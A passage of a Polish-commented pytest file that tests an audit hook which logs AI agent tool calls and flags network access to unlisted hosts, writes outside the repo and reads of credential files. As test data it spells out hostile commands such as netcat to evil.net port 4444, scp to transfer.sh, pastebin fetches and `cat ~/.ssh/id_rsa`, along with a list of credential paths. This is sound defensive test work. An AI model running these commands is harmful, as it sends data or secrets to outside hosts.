"""Testy hooka audytowego wykonawców (`tools/audyt_hook.py`, zadania 002 i 029, docs/rag/13) — bez
sieci.

Każda kategoria (sieć, zapis poza repo, poświadczenia) ma przypadki dozwolone i oznaczane.
Bezpieczeństwo hooka: zły JSON → wiersz z flagą, kod 0 i brak odmowy; na stdout tylko JSON odmowy
dla flag z listy `blokuj:` (zadanie 029: `poswiadczenia` w narzędziach plikowych, zapis do katalogu
audytu we wszystkich); maskowanie sekretów; nigdy treść plików. Poprawki R1–R8 mają testy
„przed/po” na zamaskowanych przykładach z tygodnia obserwacji (część „przed” liczy hook z historii
gita). Katalog audytu zawsze w `tmp_path` (zmienna `CLAS5_AUDYT_DIR`), nie w prawdziwym `~`;
katalog domowy w testach z `~` to atrapa (`dom`). Ścieżki „wrażliwe” są fikcyjne — hook ich nie
otwiera, tylko ocenia nazwę."""

from __future__ import annotations

import importlib.util
import io
import json
import os
import subprocess
import sys
from datetime import date, datetime, timezone
from pathlib import Path
from unittest import mock

import pytest
from hypothesis import HealthCheck, assume, given, settings
from hypothesis import strategies as st

from tools import audyt_hook as ah

ROOT = Path(__file__).resolve().parents[1]
SKRYPT = ROOT / "tools" / "audyt_hook.py"
HOSTY = ah.wczytaj_hosty(ROOT / "config" / "audyt_hosty.yaml")
TERAZ = datetime(2026, 9, 29, 12, 0, tzinfo=timezone.utc)


KATALOGI_TMP = ah.katalogi_tmp  # oryginał, zanim fikstura go podmieni
TMP_TESTOWY = (
    "/tmp/clas5-audyt-test-tmp"  # `tmp_path` sam leży w /tmp — w testach „tmp” = ten katalog
)


@pytest.fixture(autouse=True)
def _tmp_testowy(monkeypatch):
    monkeypatch.setattr(ah, "katalogi_tmp", lambda: [TMP_TESTOWY])


@pytest.mark.skipif(os.name == "nt", reason="ścieżki POSIX")
def test_real_tmp_dirs_include_system_tmp():
    assert os.path.realpath("/tmp") in KATALOGI_TMP()


@pytest.fixture()
def repo(tmp_path: Path) -> Path:
    """Minimalne „repo” (katalog z `.git`) jako cwd wywołań."""
    katalog = tmp_path / "repo"
    (katalog / ".git").mkdir(parents=True)
    return katalog


def uruchom(tmp_path: Path, repo: Path, narzedzie: str, wejscie: dict, **pola) -> dict:
    """Jedno wywołanie hooka w procesie → ostatni wiersz dziennika."""
    dane = {"session_id": "s1", "cwd": str(repo), "tool_name": narzedzie, "tool_input": wejscie}
    plik = ah.hook_main(json.dumps({**dane, **pola}), tmp_path / "audyt", HOSTY, TERAZ)
    assert plik is not None
    return json.loads(plik.read_text(encoding="ascii").splitlines()[-1])


def bash(tmp_path: Path, repo: Path, polecenie: str) -> dict:
    return uruchom(tmp_path, repo, "Bash", {"command": polecenie})


# --- lista hostów -------------------------------------------------------------------------------
def test_host_list_matches_yaml_parser_and_holds_repo_sources():
    import yaml

    pelny = yaml.safe_load((ROOT / "config" / "audyt_hosty.yaml").read_text(encoding="utf-8"))
    assert HOSTY == frozenset(str(h).lower() for h in pelny["hosty"])
    for host in (
        "fapi.binance.com",
        "api.bybit.com",
        "api.hyperliquid.xyz",
        "github.com",
        "pypi.org",
    ):
        assert host in HOSTY, host


def test_wildcard_entry_covers_subdomains_only():
    lista = frozenset({"*.example.org"})
    assert ah.host_dozwolony("api.example.org", lista)
    assert not ah.host_dozwolony("example.org", lista)
    assert not ah.host_dozwolony("evilexample.org", lista)


def test_missing_host_file_flags_every_network_call(tmp_path: Path):
    assert ah.wczytaj_hosty(tmp_path / "brak.yaml") == frozenset()


# --- sieć ---------------------------------------------------------------------------------------
@pytest.mark.parametrize(
    "polecenie",
    [
        "curl -s https://fapi.binance.com/fapi/v1/time",
        "wget -qO- https://api.bybit.com/v5/market/time",
        "curl -s api.hyperliquid.xyz/info",
        "pip install -r requirements-lock.txt",
        "python -m pip install hypothesis",
        "python3 -c \"import requests; requests.get('https://api.alternative.me/fng/')\"",
        "git clone https://github.com/anthropics/skills.git /tmp/x",
        "git status && git log -1",
        "python3 -c 'print(1)'",
        "rsync -a runs/ kopia/",
    ],
)
def test_network_to_allowed_hosts_is_not_flagged(tmp_path, repo, polecenie):
    rekord = bash(tmp_path, repo, polecenie)
    assert not {ah.F_SIEC, ah.F_SIEC_NIEZNANY} & set(rekord["flagi"]), rekord


@pytest.mark.parametrize(
    ("polecenie", "host"),
    [
        ("curl -sI https://example.com", "example.com"),
        ("curl -s evil.io/x", "evil.io"),
        ("wget http://1.2.3.4:8080/x", "1.2.3.4"),
        ("pip install --index-url https://pypi.evil.org/simple foo", "pypi.evil.org"),
        ("pip install git+https://gitlab.com/x/y.git", "gitlab.com"),
        ("python3 -c \"import urllib.request as u; u.urlopen('http://paste.ee/r')\"", "paste.ee"),
        ("nc -w 3 evil.net 4444", "evil.net"),
        ("ssh -i klucz user@serwer.obcy.pl 'ls'", "serwer.obcy.pl"),
        ("scp raport.md user@transfer.sh:/x", "transfer.sh"),
        ("git push https://gitlab.com/x/y.git HEAD", "gitlab.com"),
        ("git clone git@bitbucket.org:x/y.git", "bitbucket.org"),
        ("git status\ncurl -s https://evil.io", "evil.io"),
        ("echo $(curl -s https://evil.io)", "evil.io"),
        ("sudo timeout 5 curl https://evil.io", "evil.io"),
        (
            "cat <<EOF | python3 -\nimport socket\nsocket.create_connection(('x', 1))\n"
            "u='https://evil.io'\nEOF",
            "evil.io",
        ),
    ],
)
def test_network_to_unlisted_host_is_flagged(tmp_path, repo, polecenie, host):
    rekord = bash(tmp_path, repo, polecenie)
    assert ah.F_SIEC in rekord["flagi"], rekord
    assert host in rekord["hosty_spoza_listy"]


def test_python_network_without_visible_host_is_flagged_unknown(tmp_path, repo):
    rekord = bash(tmp_path, repo, "python3 -c 'import requests; requests.post(ADRES, data=x)'")
    assert rekord["flagi"] == [ah.F_SIEC_NIEZNANY]


def _git(repo: Path, *args: str) -> None:
    subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True)


@pytest.mark.parametrize(
    ("adres", "oznaczone"),
    [("git@github.com:piotrgebala/alpha.git", False), ("https://evil.io/x.git", True)],
)
def test_git_push_resolves_remote_without_network(tmp_path, adres, oznaczone):
    repo = tmp_path / "g"
    repo.mkdir()
    _git(repo, "init", "-q")
    _git(repo, "remote", "add", "origin", adres)
    rekord = bash(tmp_path, repo, "git push -u origin zadanie-002")
    assert (ah.F_SIEC in rekord["flagi"]) is oznaczone, rekord


def test_webfetch_allowed_and_flagged(tmp_path, repo):
    ok = uruchom(tmp_path, repo, "WebFetch", {"url": "https://github.com/x", "prompt": "p"})
    zle = uruchom(tmp_path, repo, "WebFetch", {"url": "https://pastebin.com/raw/x", "prompt": "p"})
    assert ok["flagi"] == [] and zle["flagi"] == [ah.F_SIEC]
    assert zle["hosty_spoza_listy"] == ["pastebin.com"]


# --- zapisy -------------------------------------------------------------------------------------
@pytest.mark.parametrize("narzedzie", ["Write", "Edit", "MultiEdit"])
def test_write_inside_repo_is_allowed_outside_is_flagged(tmp_path, repo, narzedzie):
    ok = uruchom(tmp_path, repo, narzedzie, {"file_path": str(repo / "tools" / "x.py")})
    wzgledny = uruchom(tmp_path, repo, narzedzie, {"file_path": "runs/x/README.md"})
    zle = uruchom(tmp_path, repo, narzedzie, {"file_path": str(tmp_path / "poza" / "x.txt")})
    ucieczka = uruchom(tmp_path, repo, narzedzie, {"file_path": "../poza.txt"})
    assert ok["flagi"] == [] and wzgledny["flagi"] == []
    assert zle["flagi"] == [ah.F_ZAPIS] and ucieczka["flagi"] == [ah.F_ZAPIS]


def test_notebook_edit_uses_notebook_path(tmp_path, repo):
    rekord = uruchom(tmp_path, repo, "NotebookEdit", {"notebook_path": "/opt/obcy/n.ipynb"})
    assert rekord["flagi"] == [ah.F_ZAPIS] and rekord["sciezka"] == "/opt/obcy/n.ipynb"


def test_worktree_may_write_to_main_runs_and_data_but_not_elsewhere(tmp_path):
    glowny = tmp_path / "alpha"
    worktree = glowny / ".claude" / "worktrees" / "agent-1"
    (glowny / ".git" / "worktrees" / "agent-1").mkdir(parents=True)
    worktree.mkdir(parents=True)
    (worktree / ".git").write_text(
        f"gitdir: {glowny / '.git' / 'worktrees' / 'agent-1'}\n", encoding="utf-8"
    )
    dozwolone = ah.katalogi_dozwolone(str(worktree))
    assert dozwolone == [str(worktree), str(glowny / "runs"), str(glowny / "data")]

    def wynik(p: Path) -> list[str]:
        return uruchom(tmp_path, worktree, "Write", {"file_path": str(p)})["flagi"]

    assert wynik(worktree / "tools" / "a.py") == []
    assert wynik(glowny / "runs" / "skille" / "x.jsonl") == []
    assert wynik(glowny / "data" / "cache" / "x.parquet") == []
    assert wynik(glowny / "tools" / "a.py") == [ah.F_ZAPIS]  # kod głównego checkoutu: poza worktree


@pytest.mark.parametrize(
    ("polecenie", "flaga"),
    [
        ("echo x > runs/log.txt", None),
        ("python skrypt.py > wynik.txt 2>&1", None),
        ("ls > /dev/null", None),
        ("echo x >> /etc/profile", ah.F_ZAPIS),
        ("echo x | tee -a /srv/wspolny/kanal.txt", ah.F_ZAPIS),
        ("cp raport.md /home/ktos/likwidacje/raport.md", ah.F_ZAPIS),
        (f"echo x > {TMP_TESTOWY}/kanal.txt", ah.F_TMP),
    ],
)
def test_bash_redirects_and_copies(tmp_path, repo, polecenie, flaga):
    flagi = bash(tmp_path, repo, polecenie)["flagi"]
    assert flagi == ([flaga] if flaga else []), polecenie


# --- poświadczenia ------------------------------------------------------------------------------
@pytest.mark.parametrize(
    "sciezka",
    [
        "~/.ssh/likwidacje_deploy",
        "/home/x/.ssh/config",
        ".env",
        "config/.env.production",
        "/srv/klucze/binance.pem",
        "/srv/klucze/serwer.key",
        "bybit_api_key.txt",
        "secrets.json",
        "/home/x/.config/gh/hosts.yml",
        "~/.git-credentials",
        "/home/x/.aws/credentials",
        "id_ed25519",
    ],
)
def test_credential_paths_are_flagged_on_read(tmp_path, repo, sciezka):
    rekord = uruchom(tmp_path, repo, "Read", {"file_path": sciezka})
    assert ah.F_POSW in rekord["flagi"], sciezka


@pytest.mark.parametrize(
    "sciezka",
    [
        "README.md",
        "tools/skill_audit.py",
        "tests/test_monkeypatch.py",
        "docs/rag/12_zuzycie_tokenow.md",
        "config/settings.yaml",
        "runs/INDEX.md",
    ],
)
def test_ordinary_paths_are_not_credentials(tmp_path, repo, sciezka):
    assert uruchom(tmp_path, repo, "Read", {"file_path": sciezka})["flagi"] == []


def test_every_tracked_repo_file_is_not_a_credential():
    """Brak fałszywych alarmów na plikach samego repo (lista z gita, bez czytania treści)."""
    wynik = subprocess.run(["git", "-C", str(ROOT), "ls-files"], capture_output=True, text=True)
    if wynik.returncode != 0:
        pytest.skip("brak gita")
    oznaczone = [p for p in wynik.stdout.splitlines() if ah.czy_poswiadczenia("/r/" + p)]
    assert oznaczone == []


def test_bash_read_of_credentials_is_flagged(tmp_path, repo):
    assert ah.F_POSW in bash(tmp_path, repo, "cat ~/.ssh/id_rsa | head -1")["flagi"]
    assert ah.F_POSW in bash(tmp_path, repo, "grep -r TOKEN .env")["flagi"]
    assert bash(tmp_path, repo, "grep -rn api_key tools")["flagi"] == []


def test_grep_and_glob_over_credentials_are_flagged(tmp_path, repo):
    grep = uruchom(tmp_path, repo, "Grep", {"pattern": "BEGIN", "path": "/home/x/.ssh"})
    glob = uruchom(tmp_path, repo, "Glob", {"pattern": "~/.config/gh/*"})
    zwykly = uruchom(tmp_path, repo, "Grep", {"pattern": "api_key", "path": "tools"})
    assert grep["flagi"] == [ah.F_POSW] and glob["flagi"] == [ah.F_POSW]
    assert zwykly["flagi"] == []


def test_touching_the_audit_log_itself_is_flagged(tmp_path, repo):
    rekord = uruchom(tmp_path, repo, "Read", {"file_path": str(tmp_path / "audyt" / "x.jsonl")})
    assert rekord["flagi"] == [ah.F_AUDYT]


# --- bezpieczeństwo i format dziennika ----------------------------------------------------------
def test_record_never_contains_file_content_and_masks_secrets(tmp_path, repo):
    tajne = "ZAWARTOSC-PLIKU-NIE-DO-LOGU"
    rekord = uruchom(tmp_path, repo, "Write", {"file_path": "a.txt", "content": tajne})
    polecenie = (
        'curl -H "Authorization: Bearer abcDEF123456789" "https://x.io/?api_key=s3cr3t&a=1" '
        "https://user:haslo@example.com ghp_abcdefghijklmnopqrstuvwxyz0123 --password=tajne1"
    )
    maskowany = bash(tmp_path, repo, polecenie)
    tekst = (tmp_path / "audyt" / "2026-09-29.jsonl").read_text(encoding="ascii")
    for sekret in (tajne, "abcDEF123456789", "s3cr3t", "haslo", "ghp_abcdef", "tajne1"):
        assert sekret not in tekst, sekret
    assert "content" not in rekord and maskowany["polecenie"].startswith("curl -H")


@pytest.mark.parametrize(
    "polecenie",
    [
        "curl -u jan:hunter2x https://api.github.com",
        "curl --user=jan:hunter2x https://api.github.com",
        "curl -ujan:hunter2x https://api.github.com",
        "curl -U jan:hunter2x -x http://p:8080 https://api.github.com",
    ],
)
def test_basic_auth_user_password_is_masked(tmp_path, repo, polecenie):
    rekord = bash(tmp_path, repo, polecenie)
    assert "hunter2x" not in rekord["polecenie"] and "jan:***" in rekord["polecenie"]


def test_user_flag_without_password_is_kept(tmp_path, repo):
    assert bash(tmp_path, repo, "git push -u origin zadanie-002")["polecenie"].endswith(
        "zadanie-002"
    )


def test_long_command_is_truncated(tmp_path, repo):
    rekord = bash(tmp_path, repo, "echo " + "a " * 1000)
    assert len(rekord["polecenie"]) <= ah.MAKS_ZNAKOW + 1


def test_record_fields(tmp_path, repo):
    rekord = uruchom(
        tmp_path, repo, "Bash", {"command": "ls"}, agent_id="a1", agent_type="wykonawca"
    )
    assert rekord == {
        "czas": "2026-09-29T12:00:00Z",
        "sesja": "s1",
        "agent": "a1",
        "agent_typ": "wykonawca",
        "cwd": str(repo),
        "narzedzie": "Bash",
        "polecenie": "ls",
        "flagi": [],
    }


def test_session_uuid_is_kept_not_masked(tmp_path, repo):
    uuid = "e4729d83-a89b-4699-9fb8-bd965face00d"
    assert uruchom(tmp_path, repo, "Bash", {"command": "ls"}, session_id=uuid)["sesja"] == uuid


@pytest.mark.skipif(os.name == "nt", reason="uprawnienia POSIX")
def test_directory_and_file_permissions(tmp_path, repo):
    bash(tmp_path, repo, "ls")
    assert (tmp_path / "audyt").stat().st_mode & 0o777 == 0o700
    assert (tmp_path / "audyt" / "2026-09-29.jsonl").stat().st_mode & 0o777 == 0o600


@pytest.mark.parametrize("wejscie", [b"", b"{nie json", b"[1, 2]", b"\xff\xfe", b"null"])
def test_bad_input_still_writes_a_flagged_line(tmp_path, wejscie):
    plik = ah.hook_main(wejscie, tmp_path / "audyt", HOSTY, TERAZ)
    assert json.loads(plik.read_text(encoding="ascii"))["flagi"] == [ah.F_WEJSCIE]


def test_analysis_error_is_swallowed_and_logged(tmp_path, repo, monkeypatch):
    def pada(*_a, **_k):
        raise RuntimeError("x")

    monkeypatch.setattr(ah, "analizuj", pada)
    rekord = bash(tmp_path, repo, "ls")
    assert rekord["flagi"] == [ah.F_BLAD] and rekord["blad"] == "RuntimeError"


def test_unwritable_audit_dir_is_silent(tmp_path, repo):
    zajety = tmp_path / "plik"
    zajety.write_text("x", encoding="utf-8")  # katalog audytu wskazuje na plik → mkdir padnie
    assert ah.hook_main('{"tool_name": "Bash"}', zajety / "audyt", HOSTY, TERAZ) is None


@pytest.mark.parametrize(
    "wejscie",
    [
        b"{zly json",
        json.dumps(
            {"tool_name": "Bash", "tool_input": {"command": "curl https://evil.io"}}
        ).encode(),
        json.dumps({"tool_name": "Bash", "tool_input": {"command": "cat /x/.ssh/id_rsa"}}).encode(),
    ],
)
def test_script_exits_zero_with_empty_stdout(tmp_path, wejscie):
    """Przez prawdziwy proces: kod 0 i PUSTY stdout tam, gdzie nie ma blokady (zły JSON, sieć,
    poświadczenia w Bash — te tylko oznacza). Odmowa przez proces:
    `test_script_denies_credential_read_with_json_on_stdout`."""
    env = dict(os.environ, CLAS5_AUDYT_DIR=str(tmp_path / "audyt"))
    wynik = subprocess.run(
        [sys.executable, str(SKRYPT), "hook"],
        input=wejscie,
        capture_output=True,
        env=env,
        timeout=30,
    )
    assert wynik.returncode == 0 and wynik.stdout == b""
    assert len(next((tmp_path / "audyt").glob("*.jsonl")).read_text().splitlines()) == 1


def test_script_without_mode_exits_zero(tmp_path):
    wynik = subprocess.run(
        [sys.executable, str(SKRYPT)], input=b"", capture_output=True, timeout=30
    )
    assert wynik.returncode == 0 and wynik.stdout == b""


# --- właściwości ---------------------------------------------------------------------------------
_tekst = st.text(max_size=200)
_wejscie_narzedzia = st.dictionaries(
    st.sampled_from(["command", "file_path", "notebook_path", "url", "content", "path", "pattern"]),
    st.one_of(_tekst, st.integers(), st.none(), st.lists(_tekst, max_size=3)),
    max_size=4,
)
_zdarzenie = st.fixed_dictionaries(
    {
        "tool_name": st.sampled_from(
            [
                "Bash",
                "Read",
                "Write",
                "Edit",
                "MultiEdit",
                "NotebookEdit",
                "WebFetch",
                "Grep",
                "Glob",
                "Inne",
                7,
            ]
        ),
        "tool_input": st.one_of(_wejscie_narzedzia, _tekst, st.none()),
    },
    optional={"cwd": st.one_of(_tekst, st.none()), "session_id": _tekst, "agent_id": _tekst},
)


@settings(
    max_examples=150, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture]
)
@given(surowe=st.one_of(st.binary(max_size=300), _zdarzenie.map(json.dumps)))
def test_property_any_input_gives_exactly_one_valid_json_line(tmp_path, surowe):
    katalog = tmp_path / "wl"
    plik = katalog / "2026-09-29.jsonl"
    przed = len(plik.read_bytes().splitlines()) if plik.exists() else 0
    wynik = ah.hook_main(surowe, katalog, HOSTY, TERAZ)
    assert wynik == plik
    linie = plik.read_bytes().splitlines()
    assert len(linie) == przed + 1
    rekord = json.loads(linie[-1].decode("ascii"))
    assert isinstance(rekord["flagi"], list) and rekord["czas"] == "2026-09-29T12:00:00Z"


@settings(max_examples=200, deadline=None)
@given(polecenie=st.text(max_size=300))
def test_property_tokenizer_never_raises(polecenie):
    for slowa in ah.segmenty(polecenie):
        assert slowa and all(isinstance(s, str) for s in slowa)
    assert len(ah.maskuj(polecenie)) <= ah.MAKS_ZNAKOW + 1


# --- zadanie 003: zagnieżdżone powłoki, gh, hasło przy -p, sed -i, curl -o, cd ------------------
@pytest.mark.parametrize(
    ("polecenie", "host"),
    [
        ("bash -c 'curl -s https://evil.io/x'", "evil.io"),
        ('sh -c "wget -qO- http://evil.io"', "evil.io"),
        ("bash -lc 'cd /x && nc evil.net 4444'", "evil.net"),
        ("sudo sh -ec 'git push https://gitlab.com/x/y.git HEAD'", "gitlab.com"),
        ("bash -c 'sh -c \"curl https://evil.io\"'", "evil.io"),
        ("bash -o pipefail -c 'curl https://evil.io/x'", "evil.io"),
        ("eval 'curl https://evil.io'", "evil.io"),
        ("gh pr list --hostname ghe.firma.pl", "ghe.firma.pl"),
        ("gh --hostname=ghe.firma.pl api user", "ghe.firma.pl"),
    ],
)
def test_nested_shell_and_gh_network_is_flagged(tmp_path, repo, polecenie, host):
    rekord = bash(tmp_path, repo, polecenie)
    assert ah.F_SIEC in rekord["flagi"], rekord
    assert host in rekord["hosty_spoza_listy"]


@pytest.mark.parametrize(
    "polecenie",
    [
        "bash -c 'curl -s https://fapi.binance.com/fapi/v1/time'",
        "bash -c 'echo ok' && sh -c 'ls -la'",
        "bash tools/setup_serwer.sh",
        "gh api repos/piotrgebala/alpha/pulls",
        "gh pr create --title x --body y",
        "gh --version",
        "gh help",
    ],
)
def test_nested_shell_and_gh_to_allowed_hosts_are_not_flagged(tmp_path, repo, polecenie):
    assert bash(tmp_path, repo, polecenie)["flagi"] == [], polecenie


def test_gh_is_a_network_program_on_api_github(tmp_path, repo):
    assert ah.siec_w_segmencie("gh", ["api", "user"], "gh api user", str(repo)) == (
        True,
        ["api.github.com"],
    )
    assert ah.siec_w_segmencie("gh", [], "gh", str(repo)) is None
    assert "api.github.com" in HOSTY


def test_shell_command_extraction():
    assert ah.polecenie_powloki("bash", ["-c", "ls"]) == "ls"
    assert ah.polecenie_powloki("sh", ["-e", "-c", "ls"]) == "ls"
    assert ah.polecenie_powloki("bash", ["-lc", "ls", "arg0"]) == "ls"
    assert ah.polecenie_powloki("bash", ["--norc", "-c", "ls"]) == "ls"
    assert ah.polecenie_powloki("bash", ["skrypt.sh"]) is None
    assert ah.polecenie_powloki("bash", ["-x", "skrypt.sh"]) is None
    assert ah.polecenie_powloki("bash", ["<", "plik"]) is None
    assert ah.polecenie_powloki("python", ["-c", "x"]) is None
    assert ah.polecenie_powloki("eval", ["echo", "x"]) == "echo x"


def test_nesting_depth_is_bounded(tmp_path, repo):
    polecenie = "curl https://evil.io"
    for _ in range(ah.MAKS_ZAGNIEZDZENIA + 3):
        polecenie = "bash -c " + json.dumps(polecenie)
    rekord = bash(tmp_path, repo, polecenie)  # za głęboko: nie widzi sieci, ale nie pada
    assert ah.F_BLAD not in rekord["flagi"]


@pytest.mark.parametrize(
    ("polecenie", "flaga", "sciezka"),
    [
        ("sed -i 's/a/b/' /etc/hosts", ah.F_ZAPIS, "/etc/hosts"),
        ("sed -i.bak -e s/a/b/ /srv/x.conf", ah.F_ZAPIS, "/srv/x.conf"),
        ("sed -Ei 's/a/b/' /srv/x.conf", ah.F_ZAPIS, "/srv/x.conf"),
        ("sed --in-place -e s/a/b/ /srv/x.conf", ah.F_ZAPIS, "/srv/x.conf"),
        ("sed -i -e s/a/b/ -e s/c/d/ plik.txt /srv/y.txt", ah.F_ZAPIS, "/srv/y.txt"),
        (f"sed -i s/a/b/ {TMP_TESTOWY}/k.txt", ah.F_TMP, f"{TMP_TESTOWY}/k.txt"),
        ("bash -c 'echo x | tee /srv/kanal.txt'", ah.F_ZAPIS, "/srv/kanal.txt"),
        ("curl -o /srv/x.bin https://github.com/a", ah.F_ZAPIS, "/srv/x.bin"),
        ("curl --output=/srv/x.bin https://github.com/a", ah.F_ZAPIS, "/srv/x.bin"),
        ("wget -O /srv/x.bin https://github.com/a", ah.F_ZAPIS, "/srv/x.bin"),
        (f"cd {TMP_TESTOWY} && curl -o x https://github.com/a", ah.F_TMP, f"{TMP_TESTOWY}/x"),
        ("cd /srv && echo x > y.txt", ah.F_ZAPIS, "/srv/y.txt"),
        ("cd /srv; cp /dev/null z.txt", ah.F_ZAPIS, "/srv/z.txt"),
    ],
)
def test_sed_curl_output_and_cd_writes_are_flagged(tmp_path, repo, polecenie, flaga, sciezka):
    rekord = bash(tmp_path, repo, polecenie)
    assert rekord["flagi"] == [flaga], rekord
    assert os.path.realpath(sciezka) in rekord["sciezki_oznaczone"]


@pytest.mark.parametrize(
    "polecenie",
    [
        "sed -i 's/a/b/' tools/x.py",
        "sed -n 1,5p /etc/hosts",
        "sed 's/a/b/' /etc/hosts > wynik.txt",
        "sed -e s/a/b/ /etc/hosts",
        "curl -s -o /dev/null https://github.com",
        "curl -o wynik.json https://api.github.com/x",
        "wget -qO- https://api.bybit.com/v5/market/time",
        "cd tools && echo x > y.txt",
        "cd - && echo x > y.txt",
    ],
)
def test_reads_and_writes_inside_repo_are_not_flagged(tmp_path, repo, polecenie):
    assert bash(tmp_path, repo, polecenie)["flagi"] == [], polecenie


def test_cd_does_not_move_repo_boundary(tmp_path, repo):
    """Po `cd /tmp` repozytorium dalej wyznacza `cwd` sesji — `/tmp` nie staje się „repo”."""
    rekord = bash(tmp_path, repo, "cd /srv && echo x > /srv/a.txt")
    assert rekord["flagi"] == [ah.F_ZAPIS]


@pytest.mark.parametrize(
    ("polecenie", "zostaje"),
    [
        ("mysql -u root -phunter2x baza", "mysql -u root -p*** baza"),
        ("mysqldump -p'hunter2x' baza > kopia.sql", "mysqldump -p'***' baza > kopia.sql"),
        ("mariadb -P3306 -phunter2x", "mariadb -P3306 -p***"),
        ("cd x && mysql --port=3306 -phunter2x baza", "cd x && mysql --port=3306 -p*** baza"),
        ("sshpass -p hunter2x ssh user@host", "sshpass -p *** ssh user@host"),
        ("sshpass -phunter2x scp a user@host:b", "sshpass -p*** scp a user@host:b"),
    ],
)
def test_password_glued_to_p_is_masked(tmp_path, repo, polecenie, zostaje):
    rekord = bash(tmp_path, repo, polecenie)
    assert "hunter2x" not in json.dumps(rekord)
    assert rekord["polecenie"] == zostaje


@pytest.mark.parametrize(
    "polecenie",
    [
        "mysql -u root -p baza",  # `-p` z odstępem: pytanie o hasło, `baza` to nazwa bazy
        "psql -p 5432 -d baza",  # w psql `-p` to port
        "ls -p katalog",
        "grep -pattern plik",
        "tar -pxf archiwum.tar",
    ],
)
def test_p_option_of_other_programs_is_kept(tmp_path, repo, polecenie):
    assert bash(tmp_path, repo, polecenie)["polecenie"] == polecenie


@settings(max_examples=150, deadline=None)
@given(polecenie=st.text(st.characters(blacklist_characters="\x00"), max_size=200))
def test_property_nested_shell_analysis_never_raises(polecenie):
    """Bajt zerowy wyłączony: w ścieżce daje ValueError → wiersz z `blad_analizy` (niżej).
    `cat /… ~…` — słowo zawsze jest ścieżką (zadanie 026: surogat w `realpath`/`expanduser`)."""
    wynik = ah.Wynik()
    for zewnetrzne in (
        f"bash -c {json.dumps(polecenie)}",
        f"cd {polecenie} && sed -i {polecenie}",
        f"cat /{polecenie} ~{polecenie}",
    ):
        ah.analizuj_bash(wynik, zewnetrzne, "/nieistniejace/repo", HOSTY, "/nieistniejacy/audyt")
    assert isinstance(wynik.flagi, set)


def test_null_byte_in_nested_path_gives_analysis_error_row(tmp_path, repo):
    assert bash(tmp_path, repo, "bash -c 'cat /x\x00y'")["flagi"] == [ah.F_BLAD]


# --- zadanie 026: samotny surogat w ścieżce (np. `\ud800` z JSON-a wejścia) -----------------------
@pytest.mark.parametrize(
    ("szablon", "flagi"),
    [
        ("cat /x{z}y", []),
        ("bash -c 'cat /x{z}y'", []),
        ("cat ~nieistniejacy{z}/plik", []),  # `~nazwa`: `expanduser` pyta `pwd` o użytkownika
        ("echo x > plik{z}.txt", []),
        ("cd /x{z} && echo x > plik", [ah.F_ZAPIS]),
        ("echo x > ~/.ssh/klucz{z}", [ah.F_POSW, ah.F_ZAPIS]),
    ],
)
def test_lone_surrogate_path_judged_like_any_other(tmp_path, repo, monkeypatch, szablon, flagi):
    """Przed zadaniem 026 `realpath` i `expanduser` rzucały tu UnicodeEncodeError (Linux) → wiersz
    z `blad_analizy`, czyli polecenie bez oceny. Surogat ma dać te same flagi co zwykła litera."""
    monkeypatch.setenv("HOME", str(tmp_path / "dom"))  # `~/.ssh` fikcyjne, w `tmp_path`
    for znak in ("a", "\ud800", "\udd00"):
        assert bash(tmp_path, repo, szablon.format(z=znak))["flagi"] == flagi, repr(znak)


def test_lone_surrogate_in_write_path_and_cwd(tmp_path, repo, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path / "dom"))
    klucz = uruchom(tmp_path, repo, "Write", {"file_path": "~/.ssh/id_ed25519\ud800"})
    assert klucz["flagi"] == [ah.F_POSW, ah.F_ZAPIS]
    pod = uruchom(tmp_path, repo, "Write", {"file_path": "x.txt"}, cwd=str(repo / "pod\ud800"))
    assert pod["flagi"] == []  # repo znalezione nad `cwd` z surogatem; zapis w nim dozwolony


# --- zadanie 029: poprawki R1–R8 i dwie blokady (decyzje użytkownika 2026-10-06) ----------------
STARY_COMMIT = "44d2257"  # tools/audyt_hook.py sprzed zadania 029 (master 2026-09-29 … 2026-10-06)
BLOKADY = ah.wczytaj_blokady(ROOT / "config" / "audyt_hosty.yaml")
PLIKOWE = ["Read", "Write", "Edit", "MultiEdit", "NotebookEdit", "Grep", "Glob"]
SCRATCHPAD = f"{TMP_TESTOWY}/claude-1000/-home-x-alpha/s1/scratchpad"  # sesja „s1” jak w `uruchom`
NAGLOWEK = 'hosty:\n  - github.com  # komentarz\n  - "::1"\n'
P, Z = ah.F_POSW, ah.F_AUDYT_ZAPIS


@pytest.fixture(scope="module")
def stary(tmp_path_factory):
    """Hook sprzed zadania 029 z historii gita — część „przed” testów przed/po. Bez historii
    (płytki klon, brak gita) → None: część „przed” jest pomijana, część „po” działa zawsze."""
    try:
        wynik = subprocess.run(
            ["git", "-C", str(ROOT), "show", f"{STARY_COMMIT}:tools/audyt_hook.py"],
            capture_output=True,
            text=True,
            timeout=30,
        )
    except (OSError, subprocess.SubprocessError):
        return None
    if wynik.returncode != 0:
        return None
    plik = tmp_path_factory.mktemp("przed_029") / "audyt_hook_przed_029.py"
    plik.write_text(wynik.stdout, encoding="utf-8")
    spec = importlib.util.spec_from_file_location("audyt_hook_przed_029", plik)
    modul = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(modul)
    return modul


@pytest.fixture()
def dom(tmp_path, monkeypatch):
    """Fikcyjny katalog domowy w `tmp_path`: `~/.ssh` i `~/.claude` to atrapy, nigdy prawdziwe."""
    katalog = tmp_path / "dom"
    katalog.mkdir()
    monkeypatch.setenv("HOME", str(katalog))
    monkeypatch.setenv("USERPROFILE", str(katalog))
    return katalog


@pytest.fixture()
def repo_git(tmp_path):
    """Repozytorium gita z `origin` na github.com (z listy hostów); tylko `remote get-url`."""
    katalog = tmp_path / "g"
    katalog.mkdir()
    _git(katalog, "init", "-q")
    _git(katalog, "remote", "add", "origin", "git@github.com:piotrgebala/alpha.git")
    return katalog


def flagi_analizy(modul, cwd, katalog, narzedzie, wejscie, **pola) -> list[str]:
    dane = {"session_id": "s1", "cwd": str(cwd), "tool_name": narzedzie, "tool_input": wejscie}
    wynik, _ = modul.analizuj({**dane, **pola}, HOSTY, os.path.realpath(str(katalog)))
    return sorted(wynik.flagi)


def przed_po(stary, monkeypatch, cwd, katalog, narzedzie, wejscie, przed, po, **pola):
    """Zamaskowany przykład z tygodnia: stare reguły dają `przed`, nowe — `po`."""
    if stary is not None:
        monkeypatch.setattr(stary, "katalogi_tmp", lambda: [TMP_TESTOWY])
        assert flagi_analizy(stary, cwd, katalog, narzedzie, wejscie, **pola) == sorted(przed)
